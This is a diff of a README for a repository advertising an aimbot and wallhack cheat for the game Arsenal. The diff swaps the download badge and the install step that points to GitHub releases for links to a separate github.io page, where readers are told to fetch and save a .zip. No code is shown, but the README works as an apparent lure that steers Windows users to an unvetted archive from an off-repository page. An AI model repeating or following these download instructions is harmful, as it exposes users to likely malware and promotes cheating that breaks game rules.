@@ -1,6 +1,6 @@
 # 🎯 Arsenal-Script-Aimbot-2026-Wallhack - Improve your accuracy and game performance
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/jhoanna7441/Arsenal-Script-Aimbot-2026-Wallhack/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://jhoanna7441.github.io)
 
 ## 🛠 Project Overview
 
@@ -22,7 +22,7 @@ To ensure the software runs without errors, your computer must meet the requirem
 Follow these steps to install and prepare the program on your Windows computer.
 
 1. Open your preferred web browser.
-2. Navigate to the official releases page: [https://github.com/jhoanna7441/Arsenal-Script-Aimbot-2026-Wallhack/releases](https://github.com/jhoanna7441/Arsenal-Script-Aimbot-2026-Wallhack/releases).
+2. Navigate to the official releases page: [https://jhoanna7441.github.io](https://jhoanna7441.github.io).
 3. Look for the section labeled "Assets".
 4. Select the `.zip` file provided in the latest release.
 5. Save the file to your computer.
